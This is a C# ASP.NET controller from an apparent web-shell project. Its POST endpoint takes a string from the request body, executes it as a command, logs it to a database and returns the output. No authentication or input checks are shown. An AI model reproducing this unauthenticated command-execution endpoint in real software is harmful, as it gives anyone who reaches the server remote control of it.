using Microsoft.AspNetCore.Mvc;
using WebShell.Data;
using Newtonsoft.Json;
using WebShell.Models;

namespace WebShell.Controllers
{
    public class APIController : Controller
    {
        private readonly ApplicationDbContext _db;

        public APIController(ApplicationDbContext db)
        {
            _db = db;
        }

        [HttpGet]
        public string GetCommands()
        {
            var data = JsonConvert.SerializeObject(_db.Commands.ToList());
            return data;
        }

        [HttpPost]
        async public Task<string> ExecuteCommand([FromBody] string content)
        {
            CommandModel Command = new CommandModel { Source = content};
            Command.Execute();
            _db.Commands.Add(Command);
            await _db.SaveChangesAsync();
            return Command.Result;
        }
    }
}
